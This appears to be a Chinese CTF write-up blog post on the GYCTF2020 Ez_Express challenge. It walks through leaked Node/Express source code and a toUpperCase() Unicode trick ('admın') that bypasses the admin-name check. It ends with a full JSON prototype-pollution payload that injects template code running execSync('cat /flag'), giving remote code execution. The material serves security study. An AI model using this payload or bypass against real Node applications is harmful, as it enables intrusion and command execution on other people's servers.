---
title: '[GYCTF2020]Ez_Express'
date: 2024-08-11 22:16:39
tags:
     - 题解
     - 原型链污染
categories: 刷题笔记
---

## [GYCTF2020]Ez_Express(原型链污染)

我们先扫描目录，发现了www.zip源码泄露

![](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408112227728.png)

我们下载源码

```
const merge = (a, b) => {
  for (var attr in b) {
    if (isObject(a[attr]) && isObject(b[attr])) {
      merge(a[attr], b[attr]);
    } else {
      a[attr] = b[attr];
    }
  }
  return a
}
const clone = (a) => {
  return merge({}, a);
}
```

`/route/index.js`中用了`merge()`和`clone()`，必是原型链了

往下找到`clone()`的位置

```
router.post('/action', function (req, res) {
  if(req.session.user.user!="ADMIN"){res.end("<script>alert('ADMIN is asked');history.go(-1);</script>")} 
  req.session.user.data = clone(req.body);
  res.end("<script>alert('success');history.go(-1);</script>");  
});
```

需要admin账号才能用到clone()

我们去到/login处

```
router.post('/login', function (req, res) {
  if(req.body.Submit=="register"){
   if(safeKeyword(req.body.userid)){
    res.end("<script>alert('forbid word');history.go(-1);</script>") 
   }
    req.session.user={
      'user':req.body.userid.toUpperCase(),
      'passwd': req.body.pwd,
      'isLogin':false
    }
    res.redirect('/'); 
  }
  else if(req.body.Submit=="login"){
    if(!req.session.user){res.end("<script>alert('register first');history.go(-1);</script>")}
    if(req.session.user.user==req.body.userid&&req.body.pwd==req.session.user.passwd){
      req.session.user.isLogin=true;
    }
    else{
      res.end("<script>alert('error passwd');history.go(-1);</script>")
    }
  
  }
  res.redirect('/'); ;
});
```

可以看到验证了注册的用户名不能为admin（大小写），不过有个地方可以注意到

```
'user':req.body.userid.toUpperCase(),
```

这里将user给转为大写了，这种转编码的通常都很容易出问题

参考p牛的文章

> Fuzz中的javascript大小写特性
>
> https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html

注册`admın`（此admın非彼admin，仔细看i部分）

> 特殊字符绕过
>
> ##### toUpperCase()
>
> 其中混入了两个奇特的字符"ı"、"ſ"。
>
>  这两个字符的“大写”是I和S。也就是说"ı".toUpperCase() == 'I'，"ſ".toUpperCase() == 'S'。通过这个小特性可以绕过一些限制。
>
> ##### toLowerCase()
>
> 这个"K"的“小写”字符是k，也就是"K".toLowerCase() == 'k'.

有一个输入框 你最喜欢的语言，还有提示`flag in /flag`

登录为admin后，就来到了原型链污染的部分

找污染的参数

```
router.get('/info', function (req, res) {
  res.render('index',data={'user':res.outputFunctionName});
})
```

可以看到在`/info`下，使用将`outputFunctionName`渲染入`index`中，而`outputFunctionName`是未定义的



```ini
res.outputFunctionName=undefined;
```

也就是可以通过污染`outputFunctionName`进行SSTI

于是抓`/action`的包，`Content-Type`设为`application/json`

payload

```json
{"lua":"a","__proto__":{"outputFunctionName":"a=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag')//"},"Submit":""}
```

![image-20240811230441206](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408112304276.png)

我们访问/info，得到flag
